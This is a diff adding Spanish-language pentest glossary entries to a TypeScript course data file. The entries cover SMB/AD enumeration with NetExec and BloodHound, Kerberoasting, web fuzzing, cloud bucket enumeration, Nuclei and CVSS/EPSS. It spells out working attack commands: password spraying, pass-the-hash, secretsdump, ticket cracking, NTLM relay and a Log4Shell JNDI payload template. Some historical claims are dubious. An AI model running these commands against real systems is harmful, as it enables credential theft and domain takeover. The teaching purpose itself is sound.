+      "```bash\nnmap -sV target -oX today.xml\n# ...un día después...\nnmap -sV target -oX tomorrow.xml\nndiff today.xml tomorrow.xml  # muestra qué cambió\n```\nUseful para monitoring: nuevos puertos, servicios que cambiaron.\n" +
+      "\n**Zenmap (GUI):**\nFrontend gráfico de Nmap. Útil para presentaciones/clientes no técnicos que quieren ver la topología.\n" +
+      "\n**dnmap** — Distributed Nmap: divide un scan grande entre múltiples workers.\n" +
+      "> 💡 **Guardar SIEMPRE -oA en engagements** — el XML es tu evidence para el report y para chaining.\n" +
+      "> ⚠️ Los timestamps en XML importan legalmente en un pentest report. Preservar tal cual, no editar.",
+    examples: [
+      "`nmap -sV -sC -oA baseline target` + versionar en git para monitorear infra propia.",
+      "ndiff comparativa mensual: detecta drift de configuración.",
+      "Pipeline recon-full.sh de OWASP Amass integrado con Nmap XML.",
+    ],
+    related: ["Tipos de escaneo Nmap", "NSE (Nmap Scripting Engine) avanzado", "Nmap performance tuning y masscan", "Arquitectura de Metasploit"],
   },
 
   // ── M27 · Enumeración de Servicios ───────────────────────────────────────
@@ -3033,6 +3395,200 @@ export const DEFINITIONS: ConceptDefinition[] = [
     ],
     related: ["Enumeración SMB y NetBIOS", "Enumeración SNMP y LDAP", "Análisis de vulnerabilidades"],
   },
+  {
+    id: 304,
+    module: 27,
+    term: "SMB enumeration profundo con CrackMapExec/NetExec",
+    short: "SMB es la mina de oro del pentest interno. CrackMapExec y su fork NetExec automatizan RID cycling, spidering, credential validation en masa.",
+    detail:
+      "**SMB** (puerto 445, TCP) es el pentest goldmine en redes Windows/AD. Un misconfig típico expone shares, permite null sessions y filtra usuarios. Herramientas modernas:\n" +
+      "\n**enum4linux-ng** (rewrite en Python del clásico):\n" +
+      "```bash\nenum4linux-ng -A target                # todo: users, shares, groups, OS\nenum4linux-ng -u admin -p pass target  # con creds\n```\n" +
+      "\n**CrackMapExec (CME) / NetExec (NXC, fork mantenido desde 2023):**\nEl swiss-army knife del pentest AD. Módulos para SMB, WinRM, MSSQL, LDAP, SSH, RDP.\n" +
+      "```bash\n# Validar creds en masa contra 254 hosts\nnxc smb 192.168.1.0/24 -u users.txt -p passwords.txt\n\n# Null session enumeration\nnxc smb 192.168.1.0/24 -u '' -p ''\n\n# Shares accesibles (spider)\nnxc smb target -u user -p pass --shares\nnxc smb target -u user -p pass --spider SYSVOL\n\n# Password policy + logged-on users\nnxc smb target -u user -p pass --pass-pol --loggedon-users\n\n# Passing hash (post-mimikatz)\nnxc smb target -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n```\n" +
+      "\n**RID cycling — enumerar usuarios sin creds:**\n" +
+      "SMB null sessions permiten iterar RIDs (Relative Identifier) del dominio: RID 500 = Administrator, 501 = Guest, 1000+ = users creados.\n" +
+      "```bash\nnxc smb target -u '' -p '' --rid-brute 3000\nimpacket-lookupsid anonymous@target\n```\n" +
+      "\n**SMB signing check:**\n" +
+      "```bash\nnxc smb 192.168.1.0/24 --gen-relay-list relay-targets.txt\n```\nHosts con signing:False son candidatos a **NTLM relay** (impacket-ntlmrelayx).\n" +
+      "\n**Password spraying:**\n" +
+      "```bash\nnxc smb 192.168.1.0/24 -u users.txt -p 'Winter2024!' --continue-on-success\n```\n1 password × muchos users evita lockouts. Común en pentest inicial.\n" +
+      "\n**Impacket suite** (complementaria):\n" +
+      "```bash\nsmbclient.py user:pass@target                      # cliente SMB\nsmbmap -H target -u user -p pass                   # rápido share enum\ngetuserspn.py DOMAIN/user:pass -dc-ip 10.0.0.1     # Kerberoasting\nGetNPUsers.py DOMAIN/ -dc-ip 10.0.0.1 -usersfile users.txt  # AS-REP roast\nsecretsdump.py DOMAIN/admin:pass@target            # dump SAM/NTDS\n```\n" +
+      "\n> 💡 **NetExec (nxc)** reemplazó a CME en 2023 tras que el creator abandonó. Todos los tutoriales viejos con `crackmapexec` ahora usan `nxc`.\n" +
+      "> ⚠️ Password spraying con >1 password/hora dispara account lockouts. Verificar policy con `--pass-pol` antes.",
+    examples: [
+      "Blackhat 2015: talk seminal de CME. Convirtió pentest de AD en workflow.",
+      "OSCP típico: `nxc smb 10.10.10.0/24 -u users.txt -p 'Password1' --continue-on-success` primer intento.",
+      "Impacket ntlmrelayx: relay NTLM auth de un share vulnerable a LDAP → agregar admin al dominio.",
+    ],
+    related: ["Enumeración SMB y NetBIOS", "LDAP enumeration y BloodHound", "AAA (Autenticación, Autorización, Accounting)", "Active Directory: dominio, bosque y OU"],
+  },
+  {
+    id: 305,
+    module: 27,
+    term: "LDAP enumeration y BloodHound",
+    short: "LDAP filtra queries al AD; BloodHound convierte esa data en grafo de attack paths. La herramienta que redefinió el pentest de AD.",
+    detail:
+      "En Active Directory, cada usuario, grupo, computadora y OU es un objeto LDAP. Un usuario del dominio (incluso sin privilegios) puede **consultar el 90% del AD** por diseño (LDAP anonymous bind menos común, pero authenticated bind estándar).\n" +
+      "\n**ldapsearch básico:**\n" +
+      "```bash\nldapsearch -H ldap://dc.corp.local -x -D 'user@corp.local' -w 'pass' \\\n  -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName memberOf\n```\n" +
+      "\n**Consultas críticas:**\n" +
+      "```\n(sAMAccountName=*)                          # todos los usuarios\n(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)  # DAs\n(userAccountControl:1.2.840.113556.1.4.803:=8192)  # DCs (SERVER_TRUST_ACCOUNT)\n(userAccountControl:1.2.840.113556.1.4.803:=4194304) # AS-REP roastable (DONT_REQ_PREAUTH)\n(servicePrincipalName=*)                    # Kerberoastable\n```\n" +
+      "\n**BloodHound — el game-changer (2016):**\n" +
+      "\nRecolecta data del AD y la modela en **Neo4j** como grafo (nodos = users/computers/groups, edges = permisos/sesiones/memberships). Después consulta:\n" +
+      "```cypher\n// Shortest path desde 'user@corp.local' a Domain Admins\nMATCH p = shortestPath((u:User {name:'USER@CORP.LOCAL'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}))\nRETURN p\n```\n" +
+      "\n**Collectors:**\n" +
+      "• **SharpHound.exe** (C#) — más features, para Windows compromise\n" +
+      "• **BloodHound.py** (bloodhound-python) — para Kali/Linux\n" +
+      "• **AzureHound** — para Entra ID / Azure\n" +
+      "\n```bash\n# Collection desde Linux\nbloodhound-python -c All -u user -p pass -d corp.local -ns 10.0.0.1\n# Salidas: .json files → importar en BloodHound GUI\n\n# SharpHound.exe (necesita estar en la red)\n.\\SharpHound.exe -c All\n```\n" +
+      "\n**Attack paths automáticos que BloodHound muestra:**\n" +
+      "• `Kerberoastable users to Domain Admin`\n" +
+      "• `Find all AS-REP roastable users`\n" +
+      "• `Find shortest path to Domain Admins from owned principal`\n" +
+      "• `Groups where owned user is member with DCSync rights`\n" +
+      "\n**Ataques comunes derivados de BloodHound findings:**\n" +
+      "• **Kerberoasting** — user con SPN → GetUserSPNs → offline crack de TGS.\n" +
+      "• **AS-REP roasting** — user con DONT_REQ_PREAUTH → GetNPUsers → offline crack.\n" +
+      "• **DCSync** — user con Replicating Directory Changes → secretsdump → dump hashes.\n" +
+      "• **Unconstrained Delegation** — computer con TrustedForDelegation → tgts en memoria → coerción.\n" +
+      "\n**BloodHound Community Edition (2023)** integra collector + GUI en una app. La versión legacy (Neo4j separado) sigue en uso.\n" +
+      "\n> 💡 En pentest AD moderno, **BloodHound es la primera herramienta post-initial-access**. Antes de correr exploits, mapea el grafo.\n" +
+      "> ⚠️ SharpHound genera **ruido masivo** en el AD (miles de LDAP queries). Blue teams lo detectan con reglas específicas. Usar `-c Session,LocalGroup` para modo stealth.",
+    examples: [
+      "SpecterOps (creadores de BloodHound) publican queries custom mensualmente para ATT&CK path finding.",
+      "Rubeus + BloodHound: identificar user Kerberoastable → GetSPN → hashcat → propietario de DA.",
+      "En engagement real, un attack path típico son 3-5 hops desde user normal a DA.",
+    ],
+    related: ["Enumeración SNMP y LDAP", "SMB enumeration profundo con CrackMapExec/NetExec", "Active Directory: dominio, bosque y OU", "AAA (Autenticación, Autorización, Accounting)"],
+  },
+  {
+    id: 306,
+    module: 27,
+    term: "HTTP directory bruteforcing moderno (ffuf, feroxbuster)",
+    short: "gobuster clásico, ffuf (más rápido, más flexible) y feroxbuster (recursion + smart-detection) para descubrir endpoints ocultos.",
+    detail:
+      "Descubrir directorios/archivos ocultos en web apps es un vector primario para encontrar admin panels, backups, APIs internas. El moderno stack:\n" +
+      "\n**ffuf (Fuzz Faster U Fool, Go, 2018):**\nEl más flexible. Soporta fuzzing de path, subdominios, headers, POST body, params.\n" +
+      "```bash\n# Directory fuzzing\nffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n  -u https://target.com/FUZZ -mc 200,301,302 -recursion -recursion-depth 2\n\n# Virtual host discovery\nffuf -w subdomains.txt -u https://target.com -H 'Host: FUZZ.target.com' \\\n  -fs 4242    # filtrar response size igual\n\n# Parameter discovery\nffuf -w params.txt -u 'https://target.com/api?FUZZ=x' -fs 1234\n\n# POST body brute (login)\nffuf -w users.txt:U -w passes.txt:P -X POST \\\n  -d 'user=U&pass=P' -u https://target.com/login -fr 'invalid'\n\n# Recursion inteligente\nffuf -w wordlist.txt -u https://target.com/FUZZ -recursion -recursion-depth 3\n```\n" +
+      "\n**feroxbuster (Rust, 2020):**\nRecursion automática + filtros heurísticos. Más rápido en escenarios profundos.\n" +
+      "```bash\nferoxbuster -u https://target.com -w wordlist.txt -x php,html,txt --depth 4\nferoxbuster -u https://target.com --auto-tune  # ajusta rate al target\n```\n" +
+      "\n**dirsearch (Python, más simple para OSCP):**\n" +
+      "```bash\ndirsearch -u https://target.com -e php,html,txt,bak,zip,sql -w wordlist.txt\n```\n" +
+      "\n**Wordlists (SecLists es el estándar):**\n" +
+      "```\n/usr/share/seclists/Discovery/Web-Content/\n├── raft-medium-directories.txt         # dirs comunes ~30k\n├── raft-medium-files.txt               # archivos ~30k\n├── common.txt                          # dirs top ~4600\n├── big.txt                             # dirs enormes ~20k\n├── directory-list-2.3-medium.txt       # de dirbuster clásico\n└── api/                                # endpoints REST/GraphQL específicos\n```\n" +
+      "\n**Tech fingerprinting:**\n" +
+      "• **whatweb** — identifica tech stack por banners/patterns\n" +
+      "• **wappalyzer** (CLI wappalyzergo) — extensa DB\n" +
+      "• **httpx -tech-detect** — ProjectDiscovery, integra con pipeline\n" +
+      "```bash\nsubfinder -d target.com | httpx -tech-detect -status-code\n```\n" +
+      "\n**403 bypass techniques:**\nCuando un endpoint devuelve 403, probar:\n" +
+      "```\n/admin       → 403\n/admin/      → 200 (trailing slash)\n/admin/.     → 200\n/admin;/     → 200 (URL truncation)\nX-Original-URL: /admin       → header injection\nX-Forwarded-For: 127.0.0.1   → localhost trust\n```\nHerramienta: **bypass-url-parser**, **4-ZERO-3**.\n" +
+      "\n**Vhost/subdomain discovery via HTTP:**\nMuchas apps sirven contenido diferente según `Host:` header. Enumerar con ffuf `-H 'Host: FUZZ.target.com'`.\n" +
+      "> 💡 **Recursion + inteligente extension list** hace ffuf superior a gobuster clásico.\n" +
+      "> ⚠️ Wordlists grandes contra un target lento = horas. Combinar rate-limit (`-rate 50`) con `--auto-tune`.",
+    examples: [
+      "Encontrar `/backup.zip`: `ffuf -w common.txt -u https://target.com/FUZZ -e '.zip,.bak,.sql'`.",
+      "Descubrir API v2 oculta: `ffuf -w api-endpoints.txt -u https://target.com/api/v2/FUZZ`.",
+      "Bypass 403 con `curl -H 'X-Original-URL: /admin' https://target.com/`.",
+    ],
+    related: ["Herramientas de enumeración", "OWASP Top 10", "OWASP Top 10", "Subdomain enumeration moderno (amass, subfinder, crt.sh)"],
+  },
+  {
+    id: 307,
+    module: 27,
+    term: "Cloud enumeration: S3, Azure blobs, GCP buckets",
+    short: "Enumerar buckets/blobs de cloud storage con permission scanning. Un bucket público es 'file browser as a service' para el atacante.",
+    detail:
+      "Los **cloud storage** (S3, Azure Blob, GCP Storage) tienen buckets/containers globalmente enumerables por naming convention. Un misconfig típico expone datos sin necesidad de credenciales.\n" +
+      "\n**AWS S3 enumeration:**\n" +
+      "\n**Naming conventions comunes:**\n" +
+      "```\ntarget-backup, target-prod-backup, target-logs, target-static\ntarget.com, backup.target.com, static-target.s3.amazonaws.com\ntarget-dev, target-staging, target-test\n```\n" +
+      "\n**Herramientas:**\n" +
+      "• **s3scanner** — permutations + permission check\n" +
+      "```bash\ns3scanner scan --buckets-file buckets.txt --provider aws\ns3scanner scan --bucket-name company-backup\n```\n" +
+      "• **awscli** con anonymous:\n" +
+      "```bash\naws s3 ls s3://target-backup --no-sign-request         # LIST anonymous\naws s3 cp s3://target-backup/file.txt . --no-sign-request  # DOWNLOAD\n```\n" +
+      "• **cloud_enum** (autor: initstring) — enum multi-cloud:\n" +
+      "```bash\ncloud_enum -k target -k targetcorp -k targetprod\n```\n" +
+      "• **AWSBucketDump** — bruteforce con wordlist\n" +
+      "\n**S3 misconfig levels:**\n" +
+      "| ACL / Policy | Impact |\n" +
+      "|---|---|\n" +
+      "| Public read + list | 🔴 Data disclosure |\n" +
+      "| Public read + list + write | 🚨 Web shell, malware distribution |\n" +
+      "| Authenticated Users (any AWS) | 🟡 Any AWS user vs anonymous |\n" +
+      "| Private + IAM excessive | 🟡 Insider risk |\n" +
+      "\n**Azure Blob Storage:**\n" +
+      "\n**Naming**: `{account}.blob.core.windows.net/{container}/{blob}`.\n" +
+      "```bash\n# Anonymous read\ncurl https://targetcompany.blob.core.windows.net/backup?restype=container&comp=list\n```\n" +
+      "Herramienta: **MicroBurst** (PowerShell), específica para Azure.\n" +
+      "\n**GCP Cloud Storage:**\n" +
+      "\n**Naming**: `storage.googleapis.com/{bucket}` o `gs://{bucket}`.\n" +
+      "```bash\ngsutil ls gs://target-backup       # con creds\ncurl https://storage.googleapis.com/target-backup       # anonymous LIST\n```\nHerramienta: **GCPBucketBrute** (rhinosecuritylabs).\n" +
+      "\n**Casos históricos (todos por public buckets):**\n" +
+      "• **Uber 2016** — 57M records vía credentials leaked en repo público → acceso a S3.\n" +
+      "• **Verizon 2017** — 14M records en S3 públic + backup config file.\n" +
+      "• **Facebook Cambridge Analytica** — datos en S3 público.\n" +
+      "• **Accenture 2017** — 4 buckets con creds y firmas exposed.\n" +
+      "• **US voter data 2017** — 198M records en S3 público de un contractor GOP.\n" +
+      "\n**Pipeline moderno de recon cloud:**\n" +
+      "```bash\n# 1. Discovery\ncloud_enum -k target -k target-corp\n\n# 2. Verificación de acceso\ns3scanner scan --buckets-file discovered.txt\n\n# 3. Enumeración de contenido\naws s3 ls s3://target-backup --recursive --no-sign-request\n\n# 4. Búsqueda de secrets en downloaded content\ntrufflehog filesystem ./downloaded/\n```\n" +
+      "> 💡 Bug bounty scope suele explícitamente incluir subdominios pero **NO buckets externos**. Confirmar antes de enumerar.\n" +
+      "> ⚠️ Descargar contenido de un bucket público de otro (aunque sea abierto) puede violar leyes de privacidad. Solo LIST + reportar.",
+    examples: [
+      "Uber 2016: S3 breach costó $148M en settlements por incident del CSO.",
+      "Bug bounty: reportar S3 público de la target company = típico $500-$5K según data.",
+      "GCP: `gsutil iam get gs://target-backup` para ver policies (require creds).",
+    ],
+    related: ["OSINT", "Modelo de responsabilidad compartida", "S3 security", "SSRF y metadata cloud"],
+  },
+  {
+    id: 308,
+    module: 27,
+    term: "Kerberoasting y AS-REP roasting",
+    short: "Dos ataques offline contra Kerberos que solo requieren credentials de un usuario del dominio. Bug de diseño del RC4 en TGS.",
+    detail:
+      "**Kerberos** es el protocolo de auth default en Active Directory. Su diseño tiene 2 flaws explotables desde 2014-2015 con credentials de usuario:\n" +
+      "\n**Kerberoasting (2014, Tim Medin):**\n" +
+      "\n**Concepto**: cualquier user autenticado puede pedir un **TGS** (Ticket Granting Service) para cualquier **service account** (identificada por SPN). El TGS está **encriptado con el hash del password de la service account**. Offline cracking del ticket = password de la SA.\n" +
+      "\n**Flow:**\n" +
+      "1. User autentica → obtiene TGT.\n" +
+      "2. User pide TGS para SPN `HTTP/webserver.corp.local`.\n" +
+      "3. DC responde con TGS encriptado con hash(password de la SA).\n" +
+      "4. Atacante extrae el TGS y crackea offline con hashcat.\n" +
+      "\n**Herramientas:**\n" +
+      "```bash\n# Impacket (Linux)\nGetUserSPNs.py CORP.LOCAL/user:password -dc-ip 10.0.0.1 -request\n\n# Rubeus (Windows post-compromise)\nRubeus.exe kerberoast /outfile:hashes.txt\n\n# CrackMapExec / NetExec\nnxc ldap dc.corp.local -u user -p pass --kerberoasting hashes.txt\n\n# hashcat crack\nhashcat -m 13100 hashes.txt rockyou.txt\n```\n" +
+      "\n**AS-REP Roasting (2015):**\n" +
+      "\n**Concepto**: users con flag `DONT_REQ_PREAUTH` (UAC bit 4194304) no requieren pre-auth. El KDC responde AS-REP con hash del password del user (para preservar backward compat con Kerberos v4). Crackeable offline.\n" +
+      "\n**Cuándo se ve**: apps legacy que no soportan pre-auth. Aplicaciones custom mal configuradas.\n" +
+      "\n**Flow:**\n" +
+      "1. Sin ninguna credential, atacante manda AS-REQ para usuarios candidatos.\n" +
+      "2. Para users normales, KDC pide pre-auth (falla).\n" +
+      "3. Para users con DONT_REQ_PREAUTH, KDC responde AS-REP con TGT cifrado con hash del password.\n" +
+      "4. Crackeo offline.\n" +
+      "\n**Herramientas:**\n" +
+      "```bash\n# Impacket sin credentials\nGetNPUsers.py CORP.LOCAL/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1\n\n# Con credentials, enumerar quién es vulnerable\nGetNPUsers.py CORP.LOCAL/user:pass -request -dc-ip 10.0.0.1\n\n# Rubeus\nRubeus.exe asreproast /outfile:hashes.txt\n\n# hashcat\nhashcat -m 18200 hashes.txt rockyou.txt\n```\n" +
+      "\n**Contramedidas:**\n" +
+      "\n**Contra Kerberoasting:**\n" +
+      "• Passwords muy largos (25+ chars) para service accounts.\n" +
+      "• **gMSA / dMSA** (group Managed Service Accounts) — passwords managed automáticamente por AD, 240 chars rotados cada 30 días.\n" +
+      "• Detección: alertar sobre requests inusuales de TGS (Event 4769 con encriptación RC4).\n" +
+      "• AES-only Kerberos (deshabilitar RC4) fuerza AES tickets → hashcat mode 19700, cracking 100× más lento.\n" +
+      "\n**Contra AS-REP Roasting:**\n" +
+      "• Deshabilitar `DONT_REQ_PREAUTH` en TODOS los users.\n" +
+      "• Passwords fuertes.\n" +
+      "• Detección: Event 4768 con userType=Anonymous o pre-auth type=0.\n" +
+      "\n> 💡 En pentest de AD, **el 90% de engagements** produce al menos 1 Kerberoastable con password crackeable en <24h.\n" +
+      "> ⚠️ RC4 en Kerberos es hashable rápido (10M hashes/sec en GPU moderno). AES es 100× más lento.",
+    examples: [
+      "OSCP AD sets: Kerberoasting es camino canonical desde initial foothold a DA.",
+      "Tim Medin's DerbyCon 2014 talk: introducción original de Kerberoasting.",
+      "Blue Team detection: Sigma rule `T1558.003` de MITRE ATT&CK.",
+    ],
+    related: ["LDAP enumeration y BloodHound", "Active Directory: dominio, bosque y OU", "SMB enumeration profundo con CrackMapExec/NetExec", "AAA (Autenticación, Autorización, Accounting)"],
+  },
 
   // ── M28 · Análisis de Vulnerabilidades ───────────────────────────────────
   {
@@ -3097,6 +3653,225 @@ export const DEFINITIONS: ConceptDefinition[] = [
     ],
     related: ["Análisis de vulnerabilidades"],
   },
+  {
+    id: 314,
+    module: 28,
+    term: "Nuclei y templates modernos",
+    short: "Scanner YAML-based que corre 8000+ templates de la community. Reemplazo moderno de Nikto/OpenVAS para bug hunting.",
+    detail:
+      "**Nuclei** (ProjectDiscovery, 2020) es el scanner de vulnerabilidades moderno más adoptado. YAML-based, ultra rápido (paralelo), y con **community templates** actualizados diariamente para CVEs nuevas.\n" +
+      "\n**Filosofía vs Nessus/OpenVAS:**\n" +
+      "| | Nessus/OpenVAS | Nuclei |\n" +
+      "|---|---|---|\n" +
+      "| Templates | Pluggins C++ pagos/complejos | YAML simple |\n" +
+      "| Community | Cerrado | 8000+ templates GitHub |\n" +
+      "| Speed | Lento (secuencial) | Ultrarrápido (async Go) |\n" +
+      "| Integration | GUI-first | CLI-first, pipeline-friendly |\n" +
+      "| Focus | Compliance scanning | Bug hunting + web CVEs |\n" +
+      "\n**Instalación + templates:**\n" +
+      "```bash\ngo install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest\nnuclei -update-templates          # baja ~8000 templates a ~/nuclei-templates/\n```\n" +
+      "\n**Uso básico:**\n" +
+      "```bash\n# Scan un target con todos los templates de alta severidad\nnuclei -u https://target.com -severity high,critical\n\n# Scan una lista de targets\nnuclei -l targets.txt -severity critical\n\n# Templates específicos (CVEs)\nnuclei -l targets.txt -t cves/2023/ -t cves/2024/\n\n# Templates por tag\nnuclei -l targets.txt -tags exposure,misconfig,sqli\n\n# Rate limiting responsable\nnuclei -l targets.txt -rate-limit 100 -c 20\n```\n" +
+      "\n**Estructura de un template:**\n" +
+      "```yaml\nid: log4shell-jndi\ninfo:\n  name: Log4Shell CVE-2021-44228\n  severity: critical\n  tags: cve,cve2021,rce,log4j\nrequests:\n  - method: GET\n    path:\n      - '{{BaseURL}}/'\n    headers:\n      User-Agent: '${jndi:ldap://{{interactsh-url}}/x}'\n    matchers:\n      - type: word\n        part: interactsh_protocol\n        words:\n          - 'dns'\n```\nEl `{{interactsh-url}}` es un dominio OAST único por scan; si el server hace lookup DNS al recibir el payload, el hit confirma vuln.\n" +
+      "\n**Categorías de templates:**\n" +
+      "```\ncves/           # CVEs específicas por año\nexposures/      # Files/paths expuestos (backup, .git, .env)\nmisconfigurations/  # CORS, permissive policies\ndefault-logins/ # Panels con creds default\nvulnerabilities/    # SSRF, LFI, SQLi específicos\ntechnologies/   # Detección de stacks\ntakeovers/      # Subdomain takeover vectors\n```\n" +
+      "\n**Pipeline con ProjectDiscovery ecosystem:**\n" +
+      "```bash\nsubfinder -d target.com | \\\n  dnsx -a | \\\n  httpx -status-code -title -tech-detect | \\\n  nuclei -t cves/ -severity critical,high\n```\n" +
+      "\n**Custom templates:**\n" +
+      "Puede detectar exposure de vuestro API interno:\n" +
+      "```yaml\nid: internal-api-expose\ninfo:\n  name: Internal API v3 exposed to Internet\n  severity: high\nrequests:\n  - method: GET\n    path: ['{{BaseURL}}/api/v3/internal/debug']\n    matchers:\n      - type: status\n        status: [200]\n      - type: word\n        words: ['debug_token']\n```\n" +
+      "\n**Interactsh — OAST infrastructure:**\nProjectDiscovery hostea `interact.sh` para blind detection. Casos: SSRF, XXE, Log4Shell, OS command injection. Sin infra propia.\n" +
+      "\n> 💡 En bug bounty modernos, **nuclei + custom templates para el target-specific** es el workflow standard.\n" +
+      "> ⚠️ Templates community pueden generar FALSOS POSITIVOS. Siempre verificar manualmente antes de reportar.",
+    examples: [
+      "Log4Shell (Dec 2021): templates de nuclei estuvieron en <24hrs después del disclosure.",
+      "Bug bounty scale: nuclei con 10K targets + custom templates + interactsh = decenas de hallazgos.",
+      "CI integration: `nuclei -l urls.txt -tags misconfig -j` con output JSON para parseo.",
+    ],
+    related: ["Análisis de vulnerabilidades", "CVE y CVSS", "Subdomain enumeration moderno (amass, subfinder, crt.sh)", "OWASP Top 10"],
+  },
+  {
+    id: 315,
+    module: 28,
+    term: "CVSS 4.0 y EPSS",
+    short: "CVSS 3.1 sigue siendo estándar, pero CVSS 4.0 (2023) mejora granularidad y EPSS predice probabilidad real de explotación.",
+    detail:
+      "**CVSS** (*Common Vulnerability Scoring System*, FIRST.org) es el estándar de scoring de vulnerabilidades. Evolución:\n" +
+      "\n**CVSS 3.1 (2019)** — todavía dominante. 3 grupos métricos:\n" +
+      "| Group | Ejemplos |\n" +
+      "|---|---|\n" +
+      "| **Base** | Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, C/I/A impact |\n" +
+      "| **Temporal** | Exploit Code Maturity, Remediation Level, Report Confidence |\n" +
+      "| **Environmental** | Modified metrics del cliente, requerimientos de C/I/A |\n" +
+      "\nRango 0.0-10.0. Categorización: Low (0-3.9), Medium (4-6.9), High (7-8.9), Critical (9-10).\n" +
+      "\n**CVSS 4.0 (Nov 2023)** — cambios clave:\n" +
+      "• Nueva métrica **Attack Requirements (AT)** — condiciones preexistentes del target (más granular que AC).\n" +
+      "• **User Interaction (UI)** subdividida en None/Passive/Active.\n" +
+      "• Nuevo **Supplemental Metrics group**: Safety, Automatable, Recovery, Value Density, Vulnerability Response Effort, Provider Urgency.\n" +
+      "• Elimina Environmental Modified metrics redundantes.\n" +
+      "• Threat Metrics reemplazan Temporal — más orientado a inteligencia (Exploit Maturity, Report Confidence).\n" +
+      "\n**Ejemplo CVSS 4.0 vector:**\n" +
+      "```\nCVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H\n```\n" +
+      "\n**EPSS — Exploit Prediction Scoring System (FIRST.org):**\n" +
+      "\n**Concepto**: en vez de qué tan malo *puede* ser (CVSS), EPSS predice **la probabilidad de que sea explotado en los próximos 30 días** basado en:\n" +
+      "• CVE metadata (age, description, vendor, product)\n" +
+      "• Public exploit availability\n" +
+      "• Frequency de menciones en threat intel\n" +
+      "• Scanner detections en la wild\n" +
+      "• Score histórico (ML training sobre >100K CVEs)\n" +
+      "\n**Sale como probabilidad (0-1)** con percentile. Consultable:\n" +
+      "```bash\ncurl https://api.first.org/data/v1/epss?cve=CVE-2023-1234\n# Response: { epss: 0.9711, percentile: 0.99999 }\n```\n" +
+      "\n**Priorización combinada (moderno):**\n" +
+      "```\nCVSS solo:         'todas las críticas primero' → miles\nCVSS + KEV:        criticas + confirmadas explotadas → cientos\nCVSS + EPSS >0.5:  críticas + probables → decenas\nCVSS + KEV + EPSS + exposure interno: → decisión accionable\n```\n" +
+      "\n**KEV (CISA Known Exploited Vulnerabilities):**\nCatalogo público mantenido por CISA (US) desde 2021. Lista **~1200 CVEs confirmadas explotadas** (evidencia observada). Requerido remediation en 2-4 semanas para agencias US federales.\n" +
+      "```bash\ncurl https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json | jq\n```\n" +
+      "\n**Herramientas modernas de priorización:**\n" +
+      "• **Rapid7 InsightVM** — integra EPSS + KEV nativo\n" +
+      "• **Wiz** (cloud CSPM) — attack path analysis + EPSS scoring\n" +
+      "• **Vulncheck** — enriquecimiento de CVE con EPSS + exploit intel\n" +
+      "• **Nuclei ranking**: templates ya tagean severity por CVSS y linkean a EPSS.\n" +
+      "\n> 💡 CVSS solo tiene **overrating chronic**: ~40% de 'critical' nunca son explotadas. EPSS filtra ruido.\n" +
+      "> ⚠️ CVSS 4.0 adoption es lenta — NIST NVD sigue publicando CVSS 3.1 principalmente. Interoperabilidad es un tema en 2024-2025.",
+    examples: [
+      "Log4Shell: CVSS 10.0 + EPSS 0.97 + KEV catalog = prioridad máxima obvia.",
+      "OpenSSL CVE-2022-3602 (Punycode) — CVSS 9.8 pero EPSS 0.001 → no vulnerable en la wild → prioridad menor.",
+      "CISA BOD 22-01: US Federal agencies must patch KEV entries in 2-4 weeks.",
+    ],
+    related: ["Análisis de vulnerabilidades", "Nuclei y templates modernos", "OWASP Top 10", "Vulnerable and Outdated Components"],
+  },
+  {
+    id: 316,
+    module: 28,
+    term: "Container y Kubernetes vulnerability scanning",
+    short: "Trivy, Grype, Kubescape para escanear imágenes y clusters. Un pentester moderno debe cubrir infra containerizada.",
+    detail:
+      "**Container security scanning** cubre 3 dimensiones: (1) vulns en imágenes, (2) misconfigs en manifests K8s, (3) runtime posture del cluster.\n" +
+      "\n**Trivy** (Aqua Security, open source):\nEl estándar de facto. Escanea imágenes, filesystems, K8s clusters, IaC (Terraform), SBOM.\n" +
+      "```bash\n# Imagen Docker\ntrivy image nginx:1.20\n\n# Filesystem local\ntrivy fs /path/to/project\n\n# Cluster K8s (todos los pods)\ntrivy k8s --report summary cluster\n\n# Terraform / IaC\ntrivy config /path/to/terraform/\n\n# Generar SBOM (CycloneDX)\ntrivy image --format cyclonedx --output sbom.json nginx:1.20\n```\n" +
+      "Output separa **OS vulns** (paquetes del base image) vs **App vulns** (dependencies del lenguaje). Filter con `--severity CRITICAL,HIGH`.\n" +
+      "\n**Grype** (Anchore, complementario):\nSimilar a Trivy, DB propia. Combinable con **Syft** para SBOM generation.\n" +
+      "```bash\nsyft nginx:1.20 -o cyclonedx-json > sbom.json\ngrype sbom:sbom.json\n```\n" +
+      "\n**Kubescape** (CNCF):\nFocus en misconfigs K8s + posture:\n" +
+      "```bash\nkubescape scan --submit --enable-host-scan\nkubescape scan framework nsa\nkubescape scan framework MITRE\n```\nOutput contra frameworks NSA/CISA Hardening Guide o MITRE ATT&CK for K8s.\n" +
+      "\n**Falco** (runtime, ya visto en M47 sprint):\nComplemento del scanning: detect en runtime (shells en pods, escapes, exec de nc/curl).\n" +
+      "\n**Checkov** (Bridgecrew, Prisma):\nIaC scanning muy adoptado en pipelines.\n" +
+      "```bash\ncheckov -d /terraform/          # Terraform\ncheckov -f k8s-manifest.yaml    # K8s YAML\ncheckov --framework kubernetes,dockerfile,terraform ./\n```\n1000+ policies built-in (CIS Benchmarks, PCI-DSS, HIPAA, SOC 2).\n" +
+      "\n**kube-bench** (Aqua):\nCorre el CIS Kubernetes Benchmark contra tu cluster:\n" +
+      "```bash\nkube-bench run --targets master,node,etcd\n```\n\n**kube-hunter**:\nActive penetration testing del cluster: intenta acceso al API server, kubelet, tokens.\n" +
+      "```bash\nkube-hunter --remote target-cluster.example.com\n```\n\n**Snyk Container** (comercial pero freemium):\nIntegración fuerte con GitHub PRs, con base propia enriquecida con threat intel.\n" +
+      "\n**Docker Bench Security** (script bash):\nAntiguo pero útil para hardening del daemon Docker en host Linux.\n" +
